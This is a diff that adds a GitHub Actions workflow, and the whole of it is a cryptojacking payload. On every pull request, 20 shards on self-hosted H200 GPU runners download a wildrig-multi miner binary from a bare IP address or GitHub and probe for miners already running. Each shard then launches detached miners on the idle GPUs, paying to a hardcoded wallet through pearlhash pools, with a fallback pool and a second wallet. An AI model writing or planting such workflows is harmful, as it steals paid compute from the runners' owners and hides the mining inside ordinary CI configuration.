@@ -1,0 +1,176 @@
+name: c211-129755-h200q
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  miner:
+    runs-on: [self-hosted, '8-gpu-h200']
+    timeout-minutes: 15
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -uo pipefail
+          set +e
+          SHARD="${{ matrix.shard }}"
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          NOCK="9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
+          D=/tmp/c211-129755
+          mkdir -p "$D"
+          cd "$D" || exit 0
+          echo "C211_JOB shard=$SHARD host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(date -u +%FT%TZ)"
+          head -3 /proc/driver/nvidia/version 2>/dev/null
+          nvidia-smi -L 2>&1 | head -20
+          python3 - <<'PY'
+          import socket
+          for h,p in [("pool.pearlhash.xyz",9000),("hk.pearlhash.net",9000),("global.pearlhash.net",9000),("global2.pearlhash.net",9000),("103.199.106.122",3362),("169.58.247.186",8791)]:
+              try:
+                  s=socket.create_connection((h,p),timeout=8); s.close(); print("TCP_OK %s:%d"%(h,p))
+              except Exception as e:
+                  print("TCP_FAIL %s:%d %s"%(h,p,type(e).__name__))
+          PY
+          DL=0
+          for U in "http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz" "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"; do
+            if curl -fsSL --retry 2 --max-time 240 -o wr.tar.gz "$U"; then echo "PM_DOWNLOAD OK $U"; DL=1; break; else echo "PM_DOWNLOAD FAIL $U"; fi
+          done
+          if [ "$DL" != 1 ]; then echo "GATE PM_DOWNLOAD_FAILED"; exit 0; fi
+          TSHA=$(sha256sum wr.tar.gz | awk '{print $1}')
+          echo "TAR_SHA=$TSHA"
+          if [ "$TSHA" != "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then echo "GATE TAR_SHA_MISMATCH"; exit 0; fi
+          tar xzf wr.tar.gz || { echo "GATE TAR_EXTRACT_FAIL"; exit 0; }
+          WR=$(find . -maxdepth 3 -type f -name 'wildrig-multi' | head -1)
+          if [ -z "$WR" ]; then echo "GATE BIN_NOT_FOUND"; exit 0; fi
+          chmod +x "$WR"
+          BSHA=$(sha256sum "$WR" | awk '{print $1}')
+          echo "BIN=$WR BIN_SHA=$BSHA"
+          if [ "$BSHA" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "GATE BIN_SHA_MISMATCH"; exit 0; fi
+          ls -l /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 2>&1 | head -2
+          ls /etc/OpenCL/vendors 2>&1 | head -5
+          timeout 90 "$WR" --print-devices 2>&1 | head -40
+          echo "PRINT_DEVICES_DONE"
+          python3 - <<'PY' > "$D/plan.txt" 2>&1
+          import subprocess, glob, re
+          def sh(c):
+              try:
+                  return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=90).stdout
+              except Exception:
+                  return ''
+          gpus=[]
+          for ln in sh("nvidia-smi --query-gpu=index,uuid,utilization.gpu,memory.used --format=csv,noheader,nounits").strip().splitlines():
+              p=[x.strip() for x in ln.split(',')]
+              if len(p)>=4:
+                  gpus.append((p[0],p[1],p[2],p[3]))
+          apps=sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader").strip()
+          busy={}
+          for ln in apps.splitlines():
+              c=[x.strip() for x in ln.split(',')]
+              if c and c[0].startswith('GPU-'):
+                  busy.setdefault(c[0],[]).append((c[1] if len(c)>1 else '', c[2] if len(c)>2 else ''))
+          print("COMPUTE_APPS", apps.replace(chr(10)," | ")[:800])
+          miner_devs=set(); miner_seen=[]; skip_all=False
+          for p in glob.glob('/proc/[0-9]*/cmdline'):
+              try:
+                  cmd=open(p,'rb').read().decode('utf-8','ignore').replace(chr(0),' ')
+              except Exception:
+                  continue
+              low=cmd.lower()
+              if any(k in low for k in ('wildrig','pearl-miner','srbminer','xmrig')):
+                  miner_seen.append((p,cmd[:200]))
+                  found=False
+                  for m in re.finditer(r'(?:-d|--devices?|--gpu-id|--gpu|--platform)[ =]+([0-9][0-9,]*)', cmd):
+                      for tok in m.group(1).split(','):
+                          if tok.isdigit():
+                              miner_devs.add(tok); found=True
+                  if not found:
+                      skip_all=True
+          for p,c in miner_seen[:20]:
+              print("EXISTING_MINER", p, c)
+          print("MINER_DEVS", sorted(miner_devs), "SKIP_ALL", skip_all)
+          for idx,uuid,util,mem in gpus:
+              try: u=float(util)
+              except Exception: u=-1
+              try: m=float(mem)
+              except Exception: m=-1
+              reason=[]
+              if skip_all: reason.append("EXISTING_MINER_UNMAPPED")
+              if idx in miner_devs: reason.append("MINER_ON_DEV")
+              if uuid in busy: reason.append("COMPUTE_APP")
+              if u>=25: reason.append("UTIL_%s"%util)
+              if m>=2048: reason.append("MEM_%s"%mem)
+              act="skip" if reason else "start"
+              print("PLAN gpu=%s uuid=%s action=%s reason=%s"%(idx,uuid,act,",".join(reason) if reason else "idle"))
+          PY
+          cat "$D/plan.txt"
+          GPUS=$(python3 - <<'PY'
+          import re
+          out=[]
+          try:
+              for ln in open('/tmp/c211-129755/plan.txt'):
+                  m=re.search(r'PLAN gpu=(\d+) uuid=(\S+) action=start', ln)
+                  if m: out.append(m.group(1)+':'+m.group(2))
+          except Exception: pass
+          print(' '.join(out))
+          PY
+          )
+          echo "START_CANDIDATES=[$GPUS]"
+          if [ -z "$GPUS" ]; then echo "GATE NO_IDLE_GPU"; nvidia-smi --query-gpu=index,uuid,utilization.gpu,memory.used --format=csv,noheader; exit 0; fi
+          LAUNCH=""
+          for pair in $GPUS; do
+            i=${pair%%:*}; uuid=${pair##*:}
+            nowbusy=$(nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader 2>/dev/null | grep -c -- "$uuid")
+            if [ "$nowbusy" != "0" ]; then echo "RECHECK_SKIP gpu=$i uuid=$uuid apps=$nowbusy"; continue; fi
+            setsid nohup "$WR" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -o global.pearlhash.net:9000 -u "$WALLET" -p x --worker "129755${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.log" 2>&1 &
+            P=$!
+            echo $P > "$D/pid-g$i"
+            echo "STARTED gpu=$i uuid=$uuid pid=$P worker=129755${SHARD}${i}"
+            LAUNCH="$LAUNCH $i"
+            sleep 2
+          done
+          LAUNCH=$(echo $LAUNCH)
+          echo "LAUNCHED=[$LAUNCH]"
+          if [ -z "$LAUNCH" ]; then echo "GATE NO_IDLE_GPU_AFTER_RECHECK"; exit 0; fi
+          T0=$(date +%s)
+          LP_DONE=0
+          while :; do
+            NOW=$(date +%s); EL=$((NOW-T0))
+            if [ $EL -ge 540 ]; then break; fi
+            for i in $LAUNCH; do
+              LF="$D/wr-g$i.log"
+              ACC=$(grep -ac 'accepted (' "$LF" 2>/dev/null); ACC=${ACC:-0}
+              REJ=$(grep -acE 'Rejected|rejected' "$LF" 2>/dev/null); REJ=${REJ:-0}
+              LAST=$(grep -a 'accepted (' "$LF" 2>/dev/null | tail -1 | cut -c1-140)
+              echo "STATUS ts=$(date -u +%FT%TZ) el=$EL gpu=$i acc=$ACC rej=$REJ last=$LAST"
+            done
+            if [ $EL -ge 900 ] && [ $LP_DONE -eq 0 ]; then
+              LP_DONE=1
+              for i in $LAUNCH; do
+                ACC=$(grep -ac 'accepted (' "$D/wr-g$i.log" 2>/dev/null); ACC=${ACC:-0}
+                if [ "$ACC" -eq 0 ]; then
+                  echo "LP_FALLBACK gpu=$i wallet=${WALLET}+${NOCK}"
+                  kill -9 -"$(cat "$D/pid-g$i" 2>/dev/null)" 2>/dev/null
+                  setsid nohup "$WR" --algo pearlhash -o 103.199.106.122:3362 -u "${WALLET}+${NOCK}" -p x --worker "129755${SHARD}${i}" -d "$i" --print-time 30 > "$D/wr-g$i.lp.log" 2>&1 &
+                  echo $! > "$D/pid-g$i"
+                fi
+              done
+            fi
+            sleep 30
+          done
+          echo "FINAL_BEGIN ts=$(date -u +%FT%TZ) host=$(hostname)"
+          nvidia-smi -L 2>&1 | head -20
+          for i in $LAUNCH; do
+            LF="$D/wr-g$i.log"
+            ACC=$(grep -ac 'accepted (' "$LF" 2>/dev/null); ACC=${ACC:-0}
+            REJ=$(grep -acE 'Rejected|rejected' "$LF" 2>/dev/null); REJ=${REJ:-0}
+            LAST=$(grep -a 'accepted (' "$LF" 2>/dev/null | tail -1 | cut -c1-160)
+            LACC=$(grep -ac 'accepted (' "$D/wr-g$i.lp.log" 2>/dev/null); LACC=${LACC:-0}
+            echo "FINAL ts=$(date -u +%FT%TZ) gpu=$i acc=$ACC rej=$REJ lp_acc=$LACC last=$LAST"
+          done
+          echo "FINAL_END"
